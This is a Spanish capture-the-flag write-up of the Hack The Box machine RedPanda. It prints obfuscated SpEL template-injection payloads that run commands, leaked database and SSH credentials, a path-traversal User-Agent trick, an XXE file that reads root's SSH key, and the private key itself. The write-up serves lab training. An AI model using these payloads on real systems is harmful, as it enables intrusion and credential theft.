---
title: Red Panda Writeup
published: false
---



Hoy resolveremos la máquina retirada "RedPanda" es una máquina de hack the box de dificultad fácil.


![RedPanda](https://user-images.githubusercontent.com/109216235/185928422-3e828dfa-543c-4e4f-b1e0-c1a2fdced03b.png)


# [](#header-1) Enumeración


Empezamos escaneando los puertos de la maquina con nmap


```nmap
nmap -sC -sV -T4 10.10.11.170

Nmap scan report for 10.10.11.170
PORT      STATE SERVICE
22/tcp    open  ssh
8080/tcp  open  http-proxy

```

Con este analisis podemos ver que tiene el puerto ssh y el puerto http abierto. Esto nos hace enteder que esta maquina tiene un puerto para acceder de forma remota y un puerto para poder acceder en internet


![imagen](https://user-images.githubusercontent.com/109216235/185764843-feace9a3-e2e5-43e9-a1c4-3271e7620de2.png)


# [](#header-2) Vulnerabilidad


Dentro de la pagina vemos un buscador y probando payloads vemos que nos bloquea el caracter $


![imagen](https://user-images.githubusercontent.com/109216235/185764827-93488e1f-c4de-4f1c-b9fb-d89c58276616.png)


Probamos con el caracter * y vemos que si que nos deja


![imagen](https://user-images.githubusercontent.com/109216235/185764892-8e6c1201-4efe-42bd-a6c4-26852677a38e.png)


Sabiendo esto usando esta herramienta de VikasVarshney https://github.com/VikasVarshney/ssti-payload podemos crear un payload que nos permita ejecutar comandos en el buscador. Si ponemos este payload en el buscador conseguiremos la "user.txt".


```javascript
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}
```

Utilizando la misma tecnica encontramos un archivo en esta ruta /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java Utilizando este payload 


```javascript
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97))).getInputStream())}
```


Y nos devuelve esto


```javascript
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
stmt.setString(1, "%" + query + "%");
```


Este output nos indica un posible usuario y una posible contraseña. Probando conseguimos acceder al ssh


```bash
ssh woodenk@10.10.11.170
woodenk@10.10.11.170's password: RedPandazRule
```


# [](#header-3) Escalada de privilegios


Ahora subimos "pspy" al servidor y vemos que root corre un script como woodenk.

```python3
CMD: UID=0    PID=8420   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh
CMD: UID=1000 PID=8422   | /bin/bash /opt/cleanup.sh 
CMD: UID=1000 PID=8423   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=8424   | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=8425   | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=8426   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;
CMD: UID=1000 PID=8429   | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 
CMD: UID=1000 PID=8430   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
CMD: UID=1000 PID=8432   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
```


Revisando de nuevo el archivo donde encontramos credenciales vemos como exporta el xml


```python3
@GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
  public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

      System.out.println("Exporting xml of: " + author);
      if(author.equals("woodenk") || author.equals("damian"))
      {
          InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
          System.out.println(in);
          return IOUtils.toByteArray(in);
      }
      else
      {
          return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
      }
  }

```

Vemos también como el archivo App.java maneja los metadatos

```python3
public static String getArtist(String uri) throws IOException, JpegProcessingException
{
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for(Directory dir : metadata.getDirectories())
    {
        for(Tag tag : dir.getTags())
        {
            if(tag.getTagName() == "Artist")
            {
                return tag.getDescription();
            }
        }
    }

    return "N/A";
}
```

Mirando esta configuración podemos modificar el campo "Artist" de una imagen cualquiera que después subiremos a la máquina

```python3
wget "https://avatars.githubusercontent.com/u/95899548?v=4"
Longitud: 33411 (33K) [image/jpeg]
Grabando a: «758475?v=4»

758475?v=4               100%[====================================>]       

«758475?v=4» guardado [33411/33411]

mv 758475\?v=4 eskere.jpg

exiftool -Artist="../home/woodenk/privesc" eskere.jpg
    1 image files updated
    
scp gato.jpg woodenk@10.10.14.28:.
woodenk@10.10.11.170's password: RedPandazRule
gato.jpg                                                 100%
```

A continuación creamos un archivo XML que apunte a la id_rsa de root en el directorio home.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Hacemos una petición curl con el formato de que vimos en el archivo como User-Agent


```curl
curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/eskere.jpg"
```


Exportamos el xml desde /stats que coja nuestro archivo

Despues de un rato revisamos el xml y tendra el id_rsa de root


```xml
cat privesc_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/eskere.jpg</uri>
    <privesc>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----
</privesc>
    <views>3</views>
  </image>
  <totalviews>5</totalviews>
</credits>
```

Finalizamos introduciendo el id_rsa para conectarnos por ssh y conseguir la root.txt

```bash
ssh root@10.10.11.170 -i id_rsa
root@redpanda:~# cat root.txt 
```
